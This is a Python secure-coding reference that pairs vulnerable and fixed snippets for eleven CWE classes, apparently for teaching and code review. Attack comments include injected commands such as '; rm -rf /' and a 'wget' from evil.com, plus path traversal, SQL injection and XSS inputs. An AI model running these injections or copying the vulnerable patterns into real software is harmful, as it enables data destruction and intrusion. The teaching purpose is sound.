# Python Secure Coding Examples

**Purpose:** Real-world vulnerable and secure code patterns for code review reference
**Based on:** OWASP ASVS v5, CWE Top 25, Python Security Best Practices

---

## SQL Injection (CWE-89)

### ❌ Vulnerable - String Concatenation

```python
def get_user_by_id(user_id):
    query = f"SELECT * FROM users WHERE id = {user_id}"
    cursor.execute(query)
    return cursor.fetchone()

# Attack: user_id = "1 OR 1=1"
# Result: Returns all users
```

### ❌ Vulnerable - String Formatting

```python
def search_users(username):
    query = "SELECT * FROM users WHERE username = '%s'" % username
    cursor.execute(query)
    return cursor.fetchall()

# Attack: username = "admin' OR '1'='1"
# Result: Authentication bypass
```

### ✅ Secure - Parameterized Query (sqlite3)

```python
def get_user_by_id(user_id):
    query = "SELECT * FROM users WHERE id = ?"
    cursor.execute(query, (user_id,))
    return cursor.fetchone()
```

### ✅ Secure - Django ORM

```python
from django.contrib.auth.models import User

def get_user_by_id(user_id):
    # Django ORM automatically parameterizes queries
    return User.objects.filter(id=user_id).first()
```

### ✅ Secure - SQLAlchemy with Bound Parameters

```python
from sqlalchemy import text

def get_user_by_id(user_id):
    stmt = text("SELECT * FROM users WHERE id = :id")
    result = conn.execute(stmt, {"id": user_id})
    return result.fetchone()
```

---

## Cross-Site Scripting (CWE-79)

### ❌ Vulnerable - Unsafe Template Rendering

```python
# Flask without autoescape
from flask import Flask, render_template_string

@app.route('/hello')
def hello():
    name = request.args.get('name', '')
    return render_template_string("<h1>Hello {{ name }}</h1>", name=name)

# Attack: name = "<script>alert('XSS')</script>"
# Result: JavaScript executes in browser
```

### ❌ Vulnerable - Using mark_safe Incorrectly

```python
# Django
from django.utils.safestring import mark_safe

def user_profile(request):
    bio = request.POST.get('bio')
    # WRONG: marks user input as safe without sanitization
    safe_bio = mark_safe(f"<div>{bio}</div>")
    return render(request, 'profile.html', {'bio': safe_bio})
```

### ✅ Secure - Automatic Escaping (Flask)

```python
from flask import Flask, render_template

@app.route('/hello')
def hello():
    name = request.args.get('name', '')
    # Jinja2 autoescape is enabled by default
    return render_template("hello.html", name=name)

# hello.html:
# <h1>Hello {{ name }}</h1>
# Special characters automatically escaped
```

### ✅ Secure - Django Automatic Escaping

```python
from django.shortcuts import render

def user_profile(request):
    bio = request.POST.get('bio')
    # Django templates auto-escape by default
    return render(request, 'profile.html', {'bio': bio})

# profile.html:
# <div>{{ bio }}</div>
# Output is automatically escaped
```

### ✅ Secure - Explicit Escaping

```python
from django.utils.html import escape

def format_user_content(user_input):
    # Explicitly escape user input
    return f"<div>{escape(user_input)}</div>"
```

---

## Command Injection (CWE-78)

### ❌ Vulnerable - shell=True with User Input

```python
import subprocess

def list_files(directory):
    # WRONG: user can inject commands
    subprocess.run(f"ls {directory}", shell=True)

# Attack: directory = "; rm -rf /"
# Result: Executes arbitrary commands
```

### ❌ Vulnerable - os.system

```python
import os

def view_file(filename):
    # WRONG: vulnerable to command injection
    os.system(f"cat {filename}")

# Attack: filename = "file.txt; wget http://evil.com/malware"
```

### ✅ Secure - List Arguments, No Shell

```python
import subprocess

def list_files(directory):
    # Correct: arguments passed as list, shell=False
    result = subprocess.run(["ls", directory],
                          shell=False,
                          capture_output=True,
                          text=True)
    return result.stdout
```

### ✅ Secure - Use Python Libraries Instead

```python
import os
from pathlib import Path

def list_files(directory):
    # Best: use Python's built-in file operations
    path = Path(directory)
    return [f.name for f in path.iterdir()]

def view_file(filename):
    # Best: use Python file operations, not shell commands
    with open(filename, 'r') as f:
        return f.read()
```

---

## Path Traversal (CWE-22)

### ❌ Vulnerable - Direct Path Concatenation

```python
from flask import send_file

@app.route('/download/<filename>')
def download_file(filename):
    # WRONG: allows path traversal
    filepath = f"/uploads/{filename}"
    return send_file(filepath)

# Attack: filename = "../../../etc/passwd"
# Result: Can access any file on system
```

### ✅ Secure - Path Validation with pathlib

```python
from flask import send_file, abort
from pathlib import Path

@app.route('/download/<filename>')
def download_file(filename):
    base_dir = Path("/uploads").resolve()
    filepath = (base_dir / filename).resolve()

    # Ensure resolved path is within base_dir
    if not str(filepath).startswith(str(base_dir)):
        abort(403)

    if not filepath.is_file():
        abort(404)

    return send_file(filepath)
```

### ✅ Secure - Whitelist Approach

```python
import os
from flask import send_file, abort

ALLOWED_FILES = {
    'report.pdf': '/uploads/report.pdf',
    'invoice.pdf': '/uploads/invoice.pdf'
}

@app.route('/download/<filename>')
def download_file(filename):
    # Only allow specific files
    filepath = ALLOWED_FILES.get(filename)
    if not filepath:
        abort(404)
    return send_file(filepath)
```

---

## Hardcoded Credentials (CWE-798)

### ❌ Vulnerable - Hardcoded in Source

```python
# WRONG: credentials in source code
DATABASE_URL = "postgresql://user:SuperSecret123@localhost/mydb"
API_KEY = "sk-1234567890abcdef"
SECRET_KEY = "my-secret-key"

db = connect(DATABASE_URL)
```

### ❌ Vulnerable - Config File in Git

```python
# config.py (committed to git)
DB_HOST = "production-db.example.com"
DB_PASSWORD = "prod_password_123"
STRIPE_SECRET_KEY = "sk_live_12345"
```

### ✅ Secure - Environment Variables

```python
import os

# Read from environment variables
DATABASE_URL = os.environ["DATABASE_URL"]
API_KEY = os.environ["API_KEY"]
SECRET_KEY = os.environ["SECRET_KEY"]

db = connect(DATABASE_URL)
```

### ✅ Secure - .env File with python-dotenv

```python
import os
from dotenv import load_dotenv

# Load .env file (which is in .gitignore)
load_dotenv()

DATABASE_URL = os.getenv("DATABASE_URL")
API_KEY = os.getenv("API_KEY")
SECRET_KEY = os.getenv("SECRET_KEY")

# .env file (NOT committed to git):
# DATABASE_URL=postgresql://user:password@localhost/mydb
# API_KEY=sk-1234567890abcdef
# SECRET_KEY=cryptographically-random-secret
```

---

## Weak Cryptography (CWE-327)

### ❌ Vulnerable - MD5 for Passwords

```python
import hashlib

def hash_password(password):
    # WRONG: MD5 is broken, easily cracked
    return hashlib.md5(password.encode()).hexdigest()
```

### ❌ Vulnerable - ECB Mode Encryption

```python
from Crypto.Cipher import AES

def encrypt_data(data, key):
    # WRONG: ECB mode is insecure
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(data)
```

### ✅ Secure - bcrypt for Passwords

```python
import bcrypt

def hash_password(password):
    # Correct: bcrypt with salt
    salt = bcrypt.gensalt(rounds=12)
    return bcrypt.hashpw(password.encode(), salt)

def verify_password(password, hashed):
    return bcrypt.checkpw(password.encode(), hashed)
```

### ✅ Secure - GCM Mode Encryption

```python
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def encrypt_data(data, key):
    # Correct: GCM provides encryption + authentication
    nonce = get_random_bytes(12)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    return nonce + tag + ciphertext

def decrypt_data(encrypted_data, key):
    nonce = encrypted_data[:12]
    tag = encrypted_data[12:28]
    ciphertext = encrypted_data[28:]

    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)
```

---

## Insecure Deserialization (CWE-502)

### ❌ Vulnerable - Pickle with Untrusted Data

```python
import pickle

def load_user_data(data):
    # WRONG: pickle can execute arbitrary code
    return pickle.loads(data)

# Attacker can craft malicious pickle that executes code on unpickle
```

### ✅ Secure - Use JSON Instead

```python
import json

def load_user_data(data):
    # Safe: JSON only supports primitive types
    return json.loads(data)
```

### ✅ Secure - Sign Pickle Data if Must Use

```python
import pickle
import hmac
import hashlib

SECRET_KEY = b"your-secret-key"

def sign_pickle(obj):
    data = pickle.dumps(obj)
    signature = hmac.new(SECRET_KEY, data, hashlib.sha256).digest()
    return signature + data

def load_signed_pickle(signed_data):
    signature = signed_data[:32]
    data = signed_data[32:]

    expected_signature = hmac.new(SECRET_KEY, data, hashlib.sha256).digest()
    if not hmac.compare_digest(signature, expected_signature):
        raise ValueError("Invalid signature")

    return pickle.loads(data)
```

---

## Information Exposure (CWE-200)

### ❌ Vulnerable - Detailed Error Messages

```python
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    try:
        user = User.objects.get(username=username)
    except User.DoesNotExist:
        # WRONG: reveals username doesn't exist
        return "Username not found", 404

    if not check_password(password, user.password_hash):
        # WRONG: reveals password is wrong
        return "Invalid password", 401
```

### ❌ Vulnerable - Debug Mode in Production

```python
# Django settings.py
DEBUG = True  # WRONG: exposes stack traces

# Flask
app = Flask(__name__)
app.debug = True  # WRONG
app.run()
```

### ✅ Secure - Generic Error Messages

```python
import logging

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    try:
        user = User.objects.get(username=username)
        if check_password(password, user.password_hash):
            # Successful login
            session['user_id'] = user.id
            return redirect('/dashboard')
    except User.DoesNotExist:
        pass

    # Generic message for all failures
    logging.warning(f"Failed login attempt for username: {username}")
    return "Invalid username or password", 401
```

### ✅ Secure - Production Configuration

```python
# Django settings.py
import os

DEBUG = os.getenv("DEBUG", "False") == "True"
ALLOWED_HOSTS = os.getenv("ALLOWED_HOSTS", "").split(",")

# Flask
import os

app = Flask(__name__)
app.config['DEBUG'] = os.getenv("FLASK_DEBUG", "0") == "1"
```

---

## Missing Authorization (CWE-862)

### ❌ Vulnerable - No Authorization Check

```python
@app.route('/user/<user_id>/delete', methods=['POST'])
def delete_user(user_id):
    # WRONG: anyone can delete any user
    User.objects.filter(id=user_id).delete()
    return "User deleted"

# Attack: Any authenticated user can delete other users
```

### ✅ Secure - Proper Authorization

```python
from flask_login import login_required, current_user
from flask import abort

@app.route('/user/<user_id>/delete', methods=['POST'])
@login_required
def delete_user(user_id):
    user = User.objects.get(id=user_id)

    # Check authorization
    if not current_user.is_admin and current_user.id != user.id:
        abort(403)  # Forbidden

    user.delete()
    return "User deleted"
```

### ✅ Secure - Django Permission Decorator

```python
from django.contrib.auth.decorators import login_required, permission_required
from django.http import HttpResponseForbidden

@login_required
@permission_required('auth.delete_user', raise_exception=True)
def delete_user(request, user_id):
    user = User.objects.get(id=user_id)

    # Additional check: users can only delete themselves unless admin
    if not request.user.is_staff and request.user.id != user.id:
        return HttpResponseForbidden()

    user.delete()
    return HttpResponse("User deleted")
```

---

## CSRF (CWE-352)

### ❌ Vulnerable - No CSRF Protection

```python
# Flask without CSRF protection
@app.route('/transfer', methods=['POST'])
def transfer_money():
    # WRONG: vulnerable to CSRF attack
    amount = request.form['amount']
    recipient = request.form['recipient']
    perform_transfer(current_user.id, recipient, amount)
    return "Transfer complete"

# Attacker can create form on evil.com that posts to this endpoint
```

### ✅ Secure - Flask with Flask-WTF

```python
from flask_wtf import FlaskForm, CSRFProtect
from wtforms import StringField, IntegerField
from wtforms.validators import DataRequired

csrf = CSRFProtect(app)

class TransferForm(FlaskForm):
    recipient = StringField('Recipient', validators=[DataRequired()])
    amount = IntegerField('Amount', validators=[DataRequired()])

@app.route('/transfer', methods=['GET', 'POST'])
def transfer_money():
    form = TransferForm()
    if form.validate_on_submit():
        # CSRF token automatically validated
        perform_transfer(current_user.id, form.recipient.data, form.amount.data)
        return "Transfer complete"
    return render_template('transfer.html', form=form)

# Template includes: {{ form.csrf_token }}
```

### ✅ Secure - Django (Built-in CSRF)

```python
from django.views.decorators.csrf import csrf_protect

@csrf_protect
def transfer_money(request):
    if request.method == 'POST':
        # CSRF token automatically validated by middleware
        amount = request.POST['amount']
        recipient = request.POST['recipient']
        perform_transfer(request.user.id, recipient, amount)
        return HttpResponse("Transfer complete")
    return render(request, 'transfer.html')

# Template includes: {% csrf_token %}
```

---

## SSRF (CWE-918)

### ❌ Vulnerable - Unvalidated URL Fetching

```python
import requests

@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    # WRONG: fetches any URL including internal resources
    response = requests.get(url)
    return response.text

# Attack: url = "http://localhost:8080/admin"
# Result: Can access internal services
```

### ✅ Secure - URL Validation

```python
import requests
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['api.example.com', 'cdn.example.com']

@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    parsed = urlparse(url)

    # Validate scheme
    if parsed.scheme not in ['http', 'https']:
        return "Invalid URL scheme", 400

    # Block internal IPs
    blocked_hosts = ['localhost', '127.0.0.1', '0.0.0.0', '169.254.169.254']
    if parsed.hostname in blocked_hosts:
        return "Access to internal resources not allowed", 403

    # Whitelist allowed domains
    if parsed.hostname not in ALLOWED_DOMAINS:
        return "Domain not allowed", 403

    try:
        response = requests.get(url, timeout=5, allow_redirects=False)
        return response.text
    except requests.RequestException:
        return "Failed to fetch URL", 500
```

---

## Weak Random (CWE-330)

### ❌ Vulnerable - Using random Module

```python
import random
import string

def generate_session_token():
    # WRONG: random module is not cryptographically secure
    return ''.join(random.choices(string.ascii_letters + string.digits, k=32))

def generate_password_reset_token():
    # WRONG: predictable
    return str(random.randint(100000, 999999))
```

### ✅ Secure - Using secrets Module

```python
import secrets

def generate_session_token():
    # Correct: cryptographically secure
    return secrets.token_hex(16)  # 32 hex characters

def generate_password_reset_token():
    # Correct: unpredictable
    return secrets.token_urlsafe(32)

def generate_api_key():
    # Correct: for API keys
    return secrets.token_urlsafe(32)
```

---

**Created:** 2026-01-17
**Total Examples:** 11 vulnerability classes
**Coverage:** OWASP Top 10, CWE Top 25
**Status:** Complete
